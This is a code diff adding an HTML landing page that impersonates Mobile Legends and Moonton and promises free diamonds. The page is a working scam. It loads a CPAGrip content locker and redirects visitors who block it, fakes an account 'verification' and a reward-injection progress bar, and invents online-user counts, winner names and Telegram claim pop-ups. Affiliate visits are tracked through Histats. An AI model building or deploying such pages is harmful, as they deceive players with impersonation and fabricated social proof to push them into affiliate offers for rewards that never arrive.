@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MLBB - Diamonds Reward Event</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,600,800&display=swap">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/id/7/72/New_Mobile_Legends_Bang_Bang_2020_Logo.png" type="image/x-icon">
+    
+    <!-- [NEW] FITUR 1: KONFIGURASI TERPUSAT (config.js) -->
+    <script src="/config.js"></script>
+
+    <style>
+        /* TEMA WARNA MLBB PREMIUM */
+        :root {
+            --mlbb-blue: #002c5f;
+            --mlbb-gold: #ffcc00;
+            --mlbb-light-blue: #00f7ff;
+            --bg-dark: #000a1a;
+            --primary: #006ce5; /* Default primary for other logic */
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+            color: #fff;
+            background: var(--bg-dark);
+            overflow-x: hidden;
+        }
+
+        /* Background Aurora (Static - Ringan) */
+        .aurora-bg {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            background: 
+                radial-gradient(circle at 10% 20%, rgba(0, 44, 95, 0.8), transparent 50%),
+                radial-gradient(circle at 90% 80%, rgba(123, 107, 255, 0.3), transparent 50%),
+                linear-gradient(180deg, #000a1a 0%, #001220 100%);
+        }
+
+        /* Header */
+        .header {
+            width: 100%;
+            height: 70px;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 2px solid var(--mlbb-gold);
+            position: fixed;
+            top: 0;
+            z-index: 1000;
+        }
+        .header img { height: 40px; }
+
+        /* Style untuk Logo Publisher */
+        .header-content {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .publisher-separator {
+            width: 1px;
+            height: 25px;
+            background: rgba(255, 255, 255, 0.3);
+        }
+        .publisher-logo {
+            height: 25px !important;
+            opacity: 0.8;
+            filter: grayscale(1) brightness(2);
+        }
+
+        /* Main Container */
+        .container {
+            display: flex;
+            max-width: 1100px;
+            margin: 100px auto 40px;
+            gap: 20px;
+            padding: 0 15px;
+            flex-wrap: wrap;
+        }
+
+        .main-content { flex: 1; min-width: 300px; text-align: center; }
+
+        /* Card Panel (Glassmorphism Ringan) */
+        .card-panel {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 25px;
+            padding: 25px;
+            color: #333;
+            border: 3px solid var(--mlbb-gold);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Floating Diamond (Fake 3D) */
+        .diamond-hero {
+            width: 100px;
+            margin: 10px auto;
+            animation: float 3s ease-in-out infinite;
+            filter: drop-shadow(0 0 15px var(--mlbb-light-blue));
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        h1 { color: var(--mlbb-blue); font-size: 20px; margin-bottom: 5px; text-transform: uppercase; }
+        .sub-text { font-size: 12px; color: #666; margin-bottom: 20px; display: block; }
+
+        /* Input */
+        input[type="text"] {
+            width: 85%;
+            padding: 15px;
+            border-radius: 12px;
+            border: 2px solid #ddd;
+            font-size: 18px;
+            text-align: center;
+            outline: none;
+            margin-bottom: 15px;
+        }
+
+        .btn-main {
+            background: linear-gradient(180deg, #004ba0 0%, #002c5f 100%);
+            color: var(--mlbb-gold);
+            padding: 16px;
+            border-radius: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            border: 1px solid var(--mlbb-gold);
+            width: 95%;
+            font-size: 18px;
+            text-transform: uppercase;
+        }
+
+        /* Diamond Packages */
+        .reward-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .reward-item {
+            background: #f1f5f9;
+            border: 2px solid #eee;
+            border-radius: 15px;
+            padding: 12px;
+            cursor: pointer;
+            color: #333;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+        .reward-item.active {
+            border-color: var(--mlbb-blue);
+            background: #e0f2ff;
+        }
+        .reward-item img { width: 45px; display: block; margin: 0 auto 5px; }
+        .reward-val { display: block; font-weight: 800; font-size: 18px; }
+
+        .progress-container { width: 100%; background: #eee; height: 18px; border-radius: 10px; margin: 15px 0; overflow: hidden; }
+        .progress-bar { height: 100%; background: var(--mlbb-blue); width: 0%; transition: 0.3s; }
+
+        .sidebar { width: 280px; background: #fff; border-radius: 20px; padding: 20px; color: #333; height: fit-content; border: 1px solid #ddd; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        @media (max-width: 850px) { .sidebar { display: none; } .container { justify-content: center; } }
+        
+        .stat-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 4px; }
+        .status-online { color: #27ae60; font-weight: bold; }
+        .winner-item { background: #f1f5f9; padding: 10px; border-radius: 10px; margin-bottom: 8px; font-size: 11px; text-align: left; border-left: 4px solid var(--mlbb-blue); }
+
+        .trust-badge {
+            margin: 5px 0 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-size: 11px;
+            color: #27ae60;
+            font-weight: 600;
+        }
+
+        /* [NEW] FITUR 2: STYLING UNTUK BOOSTER (ONLINE & NOTIF) */
+        .online-counter { display: inline-flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.5); padding: 5px 12px; border-radius: 999px; margin: 10px 0 20px; border: 1px solid rgba(39,174,96,0.5); }
+        .dot-live { width: 8px; height: 8px; background: #27ae60; border-radius: 50%; box-shadow: 0 0 8px #27ae60; animation: pulseLive 2s infinite; }
+        @keyframes pulseLive { 0% { transform: scale(0.9); opacity: 1; } 70% { transform: scale(1.2); opacity: 0.5; } 100% { transform: scale(0.9); opacity: 1; } }
+
+        .tg-notif { position: fixed; bottom: -100px; left: 20px; background: #fff; color: #333; padding: 12px 18px; border-radius: 15px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); z-index: 9999; border-left: 5px solid #24A1DE; }
+        .tg-notif img { width: 40px; border-radius: 50%; }
+        .tg-notif-text { font-size: 11px; line-height: 1.4; text-align: left; }
+        .tg-notif-text b { color: #24A1DE; }
+    </style>
+
+    <!-- KODE CPAGRIP JAVASCRIPT -->
+    <script type="text/javascript">var lck = false;</script>
+    <script type="text/javascript" src="https://playabledownload.com/script_include.php?id=1864143"></script>
+    <script type="text/javascript">if(!lck){top.location = 'https://playabledownload.com/help/ablk.php?lkt=1'; }</script>
+</head>
+<body>
+
+<div class="aurora-bg"></div>
+
+<div class="header">
+    <div class="header-content">
+        <img src="https://upload.wikimedia.org/wikipedia/id/7/72/New_Mobile_Legends_Bang_Bang_2020_Logo.png" alt="MLBB Logo">
+        <div class="publisher-separator"></div>
+        <img src="https://static.wikia.nocookie.net/mobile-legends/images/0/05/Moonton_logo2.png" class="publisher-logo" alt="Moonton">
+    </div>
+</div>
+
+<div class="container">
+    <div class="main-content">
+        <div class="card-panel">
+            
+            <div id="step1">
+                <img src="./Mobile-Legends-Diamond-Background-PNG.png" class="diamond-hero" alt="Diamonds">
+                <h1>Diamond Reward Event</h1>
+                
+                <!-- [NEW] FITUR 3: ONLINE COUNTER -->
+                <div class="online-counter">
+                    <div class="dot-live"></div>
+                    <span style="font-size: 12px; color: #fff;">Live: <b id="user-count">1,452</b> Users Online</span>
+                </div>
+
+                <div class="trust-badge">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                    Official Security Verified
+                </div>
+                <input type="text" id="uid" placeholder="Enter MLBB ID (Server)..." spellcheck="false">
+                <button onclick="startProcess()" class="btn-main">Verify Account</button>
+            </div>
+
+            <div id="step-process" style="display:none">
+                <div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--mlbb-blue); border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                <h2 id="counter" style="color:#333">0%</h2>
+                <div class="progress-container"><div class="progress-bar" id="p-bar"></div></div>
+                <p id="msg" style="color:#777; font-size: 13px;">Connecting to Moonton API...</p>
+            </div>
+
+            <div id="step-select" style="display:none">
+                <h1>Select Diamond Pack</h1>
+                <div class="reward-grid">
+                    <div class="reward-item active" onclick="selectR(this, 1200)"><img src="./Mobile-Legends-Diamond-Design-PNG.png"><span class="reward-val">1,200</span></div>
+                    <div class="reward-item" onclick="selectR(this, 3500)"><img src="./Mobile-Legends-Diamond-Design-PNG.png"><span class="reward-val">3,500</span></div>
+                    <div class="reward-item" onclick="selectR(this, 5500)"><img src="./1734510272-icon-8.webp"><span class="reward-val">5,500</span></div>
+                    <div class="reward-item" onclick="selectR(this, 10000)"><img src="./1734510272-icon-8.webp"><span class="reward-val">10,000</span></div>
+                </div>
+                <button onclick="confirmReward()" class="btn-main">Verify Selection</button>
+            </div>
+
+            <div id="step-verify" style="display:none">
+                <h1 style="color:var(--mlbb-blue)">Security Check</h1>
+                <p style="color:#333; font-size: 14px;">User <b id="user-display"></b>, please complete verification to release your <b><span id="final-amt"></span> Diamonds</b>.</p>
+                <button onclick="call_locker_smart();" class="btn-main" style="background:var(--mlbb-blue); color:var(--mlbb-gold)">Verify Now</button>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="sidebar">
+        <h4 style="margin-top:0; color:var(--mlbb-blue)">Server Information</h4>
+        <div class="stat-row"><span>Region:</span><span style="color:green">Global</span></div>
+        <div class="stat-row"><span>Status:</span><span style="color:green; font-weight:bold;">ONLINE</span></div>
+        <div class="stat-row"><span>Last Update:</span><span id="date"></span></div>
+        <hr>
+        <h4 style="color:var(--mlbb-blue)">Recent Claims</h4>
+        
+        <!-- [NEW] FITUR 4: DYNAMIC SIDEBAR REWARDS -->
+        <div id="sidebar-rewards">
+            <!-- Will be filled by JS -->
+        </div>
+    </div>
+</div>
+
+<!-- [NEW] FITUR 5: UNIVERSAL TELEGRAM POPUP -->
+<div id="tg-notif" class="tg-notif">
+    <img src="https://cdn-icons-png.flaticon.com/128/3558/3558860.png" alt="bot">
+    <div class="tg-notif-text">
+        <b>Reward Bot</b> <br>
+        <span id="tg-user">User123</span> claimed <span id="tg-reward">5,000 Diamonds</span>!
+    </div>
+</div>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+    // --- [NEW] CONFIGURASI UNIVERSAL (UBAH TIAP GAME) ---
+    const MY_REWARD_NAME = "Diamonds"; 
+    const MY_GAME_ID = "MLBB";
+
+    let user_id = "";
+    let selected_amount = 1200;
+
+    function selectR(el, amt) { $(".reward-item").removeClass("active"); $(el).addClass("active"); selected_amount = amt; }
+
+    function startProcess() {
+        user_id = $("#uid").val();
+        if(user_id.length < 5) return alert("Please enter a valid ID");
+        $("#step1").hide(); $("#step-process").show();
+        setTimeout(() => { $("#step-process").hide(); $("#step-select").show(); }, 2000);
+    }
+
+    function confirmReward() {
+        $("#step-select").hide(); $("#step-process").show();
+        $("#msg").text("Injecting reward into queue...");
+        let c = 0;
+        let iv = setInterval(() => {
+            c += 2;
+            if(c >= 100) {
+                clearInterval(iv);
+                $("#step-process").hide(); 
+                $("#user-display").text(user_id);
+                $("#final-amt").text(selected_amount.toLocaleString());
+                $("#step-verify").show();
+            }
+            $("#counter").text(c + "%");
+            $("#p-bar").css("width", c + "%");
+        }, 50);
+    }
+
+    // FUNGSI DINAMIS CPAGRIP (SMART TRACKING - DUAL KEY)
+    function call_locker_smart() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var subID = urlParams.get('s1') || 'Owner'; 
+        
+        // Ganti MY_GAME_ID sesuai folder (MLBB/DiceDreams/FreeFire)
+        var gameName = typeof MY_GAME_ID !== 'undefined' ? MY_GAME_ID : 'Unknown';
+    
+        if (typeof call_locker === 'function') {
+            call_locker({
+                s1: subID,          // Key standar
+                tracking_id: subID, // Key simulator
+                s2: gameName        // Nama Game
+            });
+        } else {
+            // Fallback jika script telat load
+            alert("System busy, please try again in a few seconds.");
+        }
+    }
+
+    // --- [NEW] LOGIKA BOOSTER DINAMIS ---
+    const fakeNames = ["James_R", "Sarah.M", "Emma_W", "John88", "David.C", "Linda_K", "Robert_S", "Michael_B", "Jessica_99", "Daniel_US", "Sophie_UK", "Oliver_CA"];
+    const fakeLocs = ["🇺🇸 USA", "🇬🇧 UK", "🇨🇦 Canada", "🇩🇪 Germany", "🇦🇺 Australia", "🇫🇷 France"];
+    const baseAmounts = [1200, 3500, 5500, 10000];
+
+    // 1. Online Counter Flux
+    let currentUsers = Math.floor(Math.random() * (2500 - 1200 + 1)) + 1200;
+    function updateOnline() {
+        currentUsers += Math.floor(Math.random() * 7) - 3;
+        document.getElementById('user-count').innerText = currentUsers.toLocaleString();
+        setTimeout(updateOnline, 4000);
+    }
+    updateOnline();
+
+    // 2. Sidebar Rewards Update
+    function updateSidebar() {
+        let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+        let amt = baseAmounts[Math.floor(Math.random() * baseAmounts.length)];
+        let html = `<div class="winner-item">User <b>${name}</b> claimed ${amt.toLocaleString()} ${MY_REWARD_NAME}<br><small>Just now</small></div>`;
+        $("#sidebar-rewards").prepend(html);
+        if($("#sidebar-rewards .winner-item").length > 3) $("#sidebar-rewards .winner-item:last").remove();
+        setTimeout(updateSidebar, 8000);
+    }
+    updateSidebar();
+
+    // 3. Telegram Popup Notif
+    function showRewardNotif() {
+        let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+        let loc = fakeLocs[Math.floor(Math.random() * fakeLocs.length)];
+        let amt = baseAmounts[Math.floor(Math.random() * baseAmounts.length)] + Math.floor(Math.random() * 99);
+        $("#tg-user").text(name + " · " + loc);
+        $("#tg-reward").text(amt.toLocaleString() + " " + MY_REWARD_NAME);
+        $("#tg-notif").css("bottom", "20px");
+        setTimeout(() => { $("#tg-notif").css("bottom", "-100px"); }, 4500);
+        setTimeout(showRewardNotif, 15000);
+    }
+    setTimeout(showRewardNotif, 5000);
+
+    document.getElementById("date").innerHTML = new Date().getDate() + "/" + (new Date().getMonth()+1);
+</script>
+
+<!-- [NEW] FITUR 6: SMART CENTRALIZED HISTATS TRACKING -->
+<script type="text/javascript">
+    var urlParams = new URLSearchParams(window.location.search);
+    var subID = urlParams.get('s1') || 'Owner';
+    var activeHistatsID = teamConfig[subID] || teamConfig['Owner'];
+
+    var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,' + activeHistatsID + ',4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    _Hasync.push(['Histats.custom_variable', ['Game', MY_GAME_ID]]);
+    _Hasync.push(['Histats.custom_variable', ['Member', subID]]);
+
+    (function() {
+        var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+        hs.src = ('//s10.histats.com/js15_as.js');
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();
+</script>
+
+<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
+</body>
+</html>
